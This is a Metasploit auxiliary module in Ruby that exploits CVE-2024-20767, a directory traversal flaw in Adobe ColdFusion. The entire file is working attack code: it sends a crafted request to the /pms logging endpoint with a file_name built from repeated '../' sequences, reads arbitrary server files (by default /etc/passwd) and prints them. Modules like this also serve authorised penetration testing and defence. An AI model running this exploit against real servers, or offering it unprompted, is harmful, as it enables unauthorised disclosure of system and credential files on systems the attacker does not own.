require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
                      'Name'           => 'CVE-2024-20767 - Adobe Coldfusion Directory Traversal',
                      'Description'    => %q{
        This module exploits a directory traversal vulnerability in Adobe Coldfusion.
        The vulnerability allows an attacker to read arbitrary files from the server.
      },
                      'Author'         => ['Christiaan Beek'],
                      'License'        => MSF_LICENSE,
                      'References'     =>
                        [
                          ['CVE', '2024-20767'],
                          ['URL', 'https://helpx.adobe.com/security/products/coldfusion/apsb24-14.html']
                        ],
                      'DisclosureDate' => '2024-03-12'
          ))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [ true, 'Base path', '/pms']),
        OptString.new('FILE_NAME', [true, 'File to retrieve', '/etc/passwd']),
        OptInt.new('DEPTH', [true, 'Traversal Depth', 5]),
        OptInt.new('NUMBER_OF_LINES', [true, 'Number of lines to retrieve', 10000])
      ])
  end

  def run
    print_status("Attempting to exploit directory traversal to read #{datastore['FILE_NAME']}")

    traversal_path = "../" * datastore['DEPTH']

    file_path = "#{traversal_path}#{datastore['FILE_NAME']}"

    res = send_request_cgi({
                             'uri' => normalize_uri(target_uri.path),
                             'vars_get' =>
                               {
                                 'module' => 'logging',
                                 'file_name' => file_path,
                                 'number_of_lines' => datastore['NUMBER_OF_LINES']
                               }
                           })

    unless res
      fail_with(Failure::Unknown, 'No response received')
      return
    end

    if res.code == 200
      print_good("File content:\n#{res.body}")
    else
      fail_with(Failure::UnexpectedReply, "Failed to retrieve file content, server responded with status code #{res.code}")
    end
  end
end